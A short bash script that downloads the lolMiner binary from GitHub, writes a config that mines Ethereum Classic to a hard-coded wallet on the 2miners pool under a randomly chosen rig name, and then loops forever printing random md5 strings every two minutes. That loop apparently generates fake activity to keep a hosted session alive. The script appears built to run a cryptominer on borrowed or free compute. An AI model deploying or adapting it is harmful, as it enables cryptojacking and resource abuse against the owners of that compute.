#!/bin/bash
#!/bin/sh
#!/bin/bash

array[0]="Kopi"
array[1]="Nyaman"
array[2]="DiLambung"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}

wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xvf lolMiner_v1.31_Lin64.tar.gz && mv 1.31 mng && cd mng

chmod +x lolMiner >/dev/null 2>&1

echo "[Etchash]
wallet = 0x5c32f4894827ee28bcfbb5a8c221470147290ae2
coin = ETC
rigName = $worker
rigPassword = x
pool1 = etc.2miners.com:1010" > config.ini
./lolMiner
while [ 1 ]; do
  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
sleep 2
done
